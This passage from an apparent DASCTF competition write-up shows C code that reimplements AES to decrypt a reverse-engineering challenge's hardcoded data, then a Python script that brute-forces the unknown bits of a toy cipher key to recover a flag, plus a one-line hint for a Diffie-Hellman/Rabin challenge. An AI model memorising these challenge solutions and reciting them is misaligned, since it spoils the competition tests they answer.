((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^ ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MixColumnsRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a, b, c, d;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a = state[<span class="number">4</span>*i];</span><br><span class="line">		b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">		c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">		d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line">		state[<span class="number">4</span> * i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">CharToWord</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *character, <span class="type">int</span> first)</span><span class="comment">/*字节转字*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (((<span class="type">int</span>)character[first] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">24</span>) | (((<span class="type">int</span>)character[first + <span class="number">1</span>] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">16</span>) | (((<span class="type">int</span>)character[first + <span class="number">2</span>] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">8</span>) | ((<span class="type">int</span>)character[first + <span class="number">3</span>] &amp; <span class="number">0x000000ff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WordToChar</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> word, <span class="type">unsigned</span> <span class="type">char</span> *character)</span><span class="comment">/*字转字节*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; character[i++] = (word &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ExtendCipherKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *CipherKey_word, <span class="type">int</span> round)</span><span class="comment">/*密钥扩展*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> CipherKeyChar[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;,CipherKeyCharEncrypt[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> Rcon[<span class="number">10</span>] = &#123; <span class="number">0x01000000</span>,<span class="number">0x02000000</span>,<span class="number">0x04000000</span>,<span class="number">0x08000000</span>,<span class="number">0x10000000</span>,<span class="number">0x20000000</span>,<span class="number">0x40000000</span>,<span class="number">0x80000000</span>,<span class="number">0x1B000000</span>,<span class="number">0x36000000</span> &#125;;	<span class="comment">//轮常量</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!(i % <span class="number">4</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			WordToChar((CipherKey_word[i - <span class="number">1</span>] &gt;&gt; <span class="number">24</span>) | (CipherKey_word[i - <span class="number">1</span>] &lt;&lt; <span class="number">8</span>), CipherKeyChar);</span><br><span class="line">			SubBytes(CipherKeyChar, CipherKeyCharEncrypt, <span class="number">4</span>);</span><br><span class="line">			CipherKey_word[i] = CipherKey_word[i - <span class="number">4</span>] ^ CharToWord(CipherKeyCharEncrypt, <span class="number">0</span>) ^ Rcon[round];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			CipherKey_word[i] = CipherKey_word[i - <span class="number">4</span>] ^ CipherKey_word[i - <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">genString</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">       <span class="type">char</span> *text = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">       &#123;</span><br><span class="line">       text[i]=<span class="number">35</span>+i;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">puts</span>(text);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> table[]=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"><span class="type">char</span> res[]=&#123;<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x3a</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x3e</span>,<span class="number">0x3d</span>,<span class="number">0x85</span>,<span class="number">0x84</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x89</span>,<span class="number">0x88</span>,<span class="number">0x87</span>,<span class="number">0x8e</span>,<span class="number">0x8d</span>,<span class="number">0x8c</span>,<span class="number">0x8b</span>,<span class="number">0x92</span>,<span class="number">0x91</span>,<span class="number">0x90</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>,<span class="number">0x79</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x7d</span>,<span class="number">0x7c</span>,<span class="number">0xa5</span>,<span class="number">0xa4</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,<span class="number">0xa9</span>,<span class="number">0xa8</span>,<span class="number">0xa7</span>,<span class="number">0xae</span>,<span class="number">0xad</span>,<span class="number">0xac</span>,<span class="number">0xab</span>,<span class="number">0xb2</span>,</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0xb0</span>,<span class="number">0xaf</span>,<span class="number">0x96</span>,<span class="number">0x95</span>,<span class="number">0x94</span>,<span class="number">0x93</span>,<span class="number">0x9a</span>,<span class="number">0x99</span>,<span class="number">0x98</span>,<span class="number">0x97</span>,<span class="number">0x9e</span>,<span class="number">0x9d</span>,<span class="number">0x9c</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x4a</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x3c</span>,<span class="number">0x3b</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,<span class="number">0x9b</span>,<span class="number">0xa2</span>,<span class="number">0xa1</span>,<span class="number">0xa0</span>,<span class="number">0x9f</span>,<span class="number">0x86</span>,<span class="number">0x7b</span>,<span class="number">0x82</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x66</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getcc</span><span class="params">(<span class="type">char</span> in)</span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">96</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> (in==res[i])</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">return</span> table[i];</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;**************AES加解密***************\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, k;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> mm[]=&#123;<span class="number">0x71</span>,<span class="number">0x55</span>,<span class="number">0x7f</span>,<span class="number">0xa8</span>,<span class="number">0xfa</span>,<span class="number">0x0e</span>,<span class="number">0xa3</span>,<span class="number">0x19</span>,<span class="number">0xa0</span>,<span class="number">0x5c</span>,<span class="number">0xf9</span>,<span class="number">0x0e</span>,<span class="number">0x9b</span>,<span class="number">0x0b</span>,<span class="number">0x5e</span>,<span class="number">0xfc</span>,<span class="number">0xb5</span>,<span class="number">0xa8</span>,<span class="number">0x49</span>,<span class="number">0xfd</span>,<span class="number">0x90</span>,<span class="number">0x99</span>,<span class="number">0x74</span>,<span class="number">0xc7</span>,<span class="number">0x77</span>,<span class="number">0x02</span>,<span class="number">0x6a</span>,<span class="number">0xf5</span>,<span class="number">0x9a</span>,<span class="number">0x6a</span>,<span class="number">0xba</span>,<span class="number">0x7f</span>,<span class="number">0xfb</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x54</span>,<span class="number">0xee</span>,<span class="number">0xe8</span>,<span class="number">0xbb</span>,<span class="number">0x78</span>,<span class="number">0x01</span>,<span class="number">0xe7</span>,<span class="number">0xbb</span>,<span class="number">0xa2</span>,<span class="number">0x95</span>,<span class="number">0x95</span>,<span class="number">0xfa</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> PlainText[<span class="number">48</span>] =<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">    ,</span><br><span class="line">		CipherKey[<span class="number">16</span>] = &#123; <span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x37</span>,<span class="number">0x42</span>,<span class="number">0x4d</span>,<span class="number">0x58</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,<span class="number">0x10</span> &#125;,</span><br><span class="line">		CipherKey1[<span class="number">16</span>] = &#123;  <span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x37</span>,<span class="number">0x42</span>,<span class="number">0x4d</span>,<span class="number">0x58</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,<span class="number">0x10</span>&#125;,</span><br><span class="line">		PlainText1[<span class="number">48</span>] = &#123; </span><br><span class="line">              <span class="number">0x71</span>, <span class="number">0x55</span>, <span class="number">0x7F</span>, <span class="number">0xA8</span>, <span class="number">0xFA</span>, <span class="number">0x0E</span>, <span class="number">0xA3</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x5C</span>, <span class="number">0xF9</span>, <span class="number">0x0E</span>, <span class="number">0x9B</span>, <span class="number">0x0B</span>, <span class="number">0x5E</span>, <span class="number">0xFC</span>, </span><br><span class="line">    <span class="number">0xB5</span>, <span class="number">0xA8</span>, <span class="number">0x49</span>, <span class="number">0xFD</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x74</span>, <span class="number">0xC7</span>, <span class="number">0x77</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0xF5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0xBA</span>, <span class="number">0x7F</span>, </span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0xE7</span>, <span class="number">0x68</span>, <span class="number">0xDA</span>, <span class="number">0x54</span>, <span class="number">0xEE</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0xA2</span>, <span class="number">0x95</span>, <span class="number">0x95</span>, <span class="number">0xFA</span></span><br><span class="line"> </span><br><span class="line">         &#125;,</span><br><span class="line">		PlainText2[<span class="number">48</span>] = &#123;   <span class="number">0x71</span>, <span class="number">0x55</span>, <span class="number">0x7F</span>, <span class="number">0xA8</span>, <span class="number">0xFA</span>, <span class="number">0x0E</span>, <span class="number">0xA3</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x5C</span>, <span class="number">0xF9</span>, <span class="number">0x0E</span>, <span class="number">0x9B</span>, <span class="number">0x0B</span>, <span class="number">0x5E</span>, <span class="number">0xFC</span>, </span><br><span class="line">    <span class="number">0xB5</span>, <span class="number">0xA8</span>, <span class="number">0x49</span>, <span class="number">0xFD</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x74</span>, <span class="number">0xC7</span>, <span class="number">0x77</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0xF5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0xBA</span>, <span class="number">0x7F</span>, </span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0xE7</span>, <span class="number">0x68</span>, <span class="number">0xDA</span>, <span class="number">0x54</span>, <span class="number">0xEE</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0xA2</span>, <span class="number">0x95</span>, <span class="number">0x95</span>, <span class="number">0xFA</span></span><br><span class="line">  &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> CipherKey_word[<span class="number">44</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; CipherKey_word[i++] = CharToWord(CipherKey, <span class="number">4</span> * i));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;密钥：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;%2X &quot;</span>, CipherKey[k]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n明文：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, PlainText[k]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n**************开始加密****************&quot;</span>);</span><br><span class="line">	AddRoundKey(PlainText, CipherKey);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SubBytes(PlainText, PlainText1, <span class="number">16</span>);<span class="comment">/*S盒置换*/</span></span><br><span class="line">		ShiftRows(PlainText1);	<span class="comment">/*行移位*/</span></span><br><span class="line">		MixColumns(PlainText1, PlainText2);	<span class="comment">/*列混淆*/</span></span><br><span class="line">		ExtendCipherKey(CipherKey_word + <span class="number">4</span> * i, i);<span class="comment">/*子密钥生成*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)  WordToChar(CipherKey_word[k + <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k);</span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)  <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, CipherKey[k]);</span><br><span class="line">		AddRoundKey(PlainText2, CipherKey);<span class="comment">/*轮密钥加*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)  PlainText[k] = PlainText2[k];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	SubBytes(PlainText, PlainText1, <span class="number">16</span>);</span><br><span class="line">	ShiftRows(PlainText1);</span><br><span class="line">	ExtendCipherKey(CipherKey_word + <span class="number">4</span> * i, i);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>;WordToChar(CipherKey_word[k + <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k), k++);</span><br><span class="line">	AddRoundKey(PlainText1, CipherKey);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n最终AES加密后的密文为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)  <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, PlainText1[i]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    PlainText1[i]=mm[i];   <span class="comment">// 解密第二段第三段偏移16，32即可</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n**************开始解密***************&quot;</span>);</span><br><span class="line">	AddRoundKey(PlainText1, CipherKey);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	    SubBytesRe(PlainText1, PlainText, <span class="number">16</span>);<span class="comment">/*S盒置换*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; WordToChar(CipherKey_word[k + <span class="number">40</span> - <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k),k++);<span class="comment">/*子密钥生成*/</span></span><br><span class="line">		ShiftRowsRe(PlainText);<span class="comment">/*行移位逆*/</span></span><br><span class="line">		AddRoundKey(PlainText, CipherKey);<span class="comment">/*轮密钥加*/</span></span><br><span class="line">		MixColumnsRe(PlainText);<span class="comment">/*列混淆逆运算*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>;PlainText1[k] = PlainText[k],k++);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n最后一次循环：&quot;</span>);</span><br><span class="line">	ShiftRowsRe(PlainText);<span class="comment">/*行移位逆*/</span></span><br><span class="line">	SubBytesRe(PlainText, PlainText1, <span class="number">16</span>);<span class="comment">/*S盒置换*/</span></span><br><span class="line">	AddRoundKey(PlainText1, CipherKey1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n最终AES解密后的明文为：&quot;</span>);</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,getcc( PlainText1[i]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Crypto">Crypto</h3>
<h4 id="MyCode">MyCode</h4>
<p>key一共四字节，已经给了12bit，爆破就行了</p>
<p>要先把给的Ciphertext两两分割转列表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">substitute</span>(<span class="params">state, sub_box</span>):</span><br><span class="line">    <span class="keyword">return</span> [sub_box[b &amp; <span class="number">0xF</span>] | (sub_box[(b &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>] &lt;&lt; <span class="number">4</span>) <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_round_keys</span>(<span class="params">base_key, rounds</span>):</span><br><span class="line">    round_keys = []</span><br><span class="line">    temp_key = base_key</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        round_keys.append(temp_key &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        temp_key ^= ((temp_key &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>) | ((temp_key &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>)</span><br><span class="line">    <span class="keyword">return</span> round_keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_state</span>(<span class="params">base_key, state, rounds, encrypt</span>):</span><br><span class="line">    sub_box = [<span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0xD</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0xC</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0x7</span>]</span><br><span class="line">    inv_sub_box = [<span class="number">0xA</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0xB</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xF</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xC</span>, <span class="number">0x4</span>, <span class="number">0xD</span>, <span class="number">0xE</span>]</span><br><span class="line"></span><br><span class="line">    round_keys = generate_round_keys(base_key, rounds)</span><br><span class="line">    <span class="keyword">if</span> encrypt:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">            state = substitute(state, sub_box)</span><br><span class="line">            state = [s ^ ((round_keys[<span class="built_in">round</span>] &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(state)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [s ^ ((round_keys[<span class="built_in">round</span>] &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(state)]</span><br><span class="line">            state = substitute(state, inv_sub_box)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key, rounds=<span class="number">10</span></span>):</span><br><span class="line">    length = <span class="built_in">len</span>(plaintext)</span><br><span class="line">    padded_length = length <span class="keyword">if</span> length % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">else</span> length + (<span class="number">4</span> - (length % <span class="number">4</span>))</span><br><span class="line">    plaintext += <span class="string">b&#x27;\x00&#x27;</span> * (padded_length - length)</span><br><span class="line"></span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>(padded_length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, padded_length, <span class="number">4</span>):</span><br><span class="line">        state = <span class="built_in">list</span>(plaintext[i:i+<span class="number">4</span>])</span><br><span class="line">        state = process_state(key, state, rounds, <span class="literal">True</span>)</span><br><span class="line">        ciphertext[i:i+<span class="number">4</span>] = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key, rounds=<span class="number">10</span></span>):</span><br><span class="line">    length = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>(length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">4</span>):</span><br><span class="line">        state = <span class="built_in">list</span>(ciphertext[i:i+<span class="number">4</span>])</span><br><span class="line">        state = process_state(key, state, rounds, <span class="literal">False</span>)</span><br><span class="line">        plaintext[i:i+<span class="number">4</span>] = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext.rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ciphertext = <span class="string">&#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(Ciphertext),<span class="number">2</span>): </span><br><span class="line">    ciphertext.append(<span class="built_in">int</span>(Ciphertext[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&#x27;DASCTF&#123;&#x27;</span></span><br><span class="line">key = <span class="number">0xECB</span></span><br><span class="line"><span class="built_in">print</span>(key.bit_length())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    flag = decrypt(ciphertext,key*<span class="number">2</span>**<span class="number">20</span>+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h4 id="DlcgH-r">DlcgH_r</h4>
<p>Diffie-Hellman问题，但其实简单爆破出s和t即可，然后就是rabin解密</p>
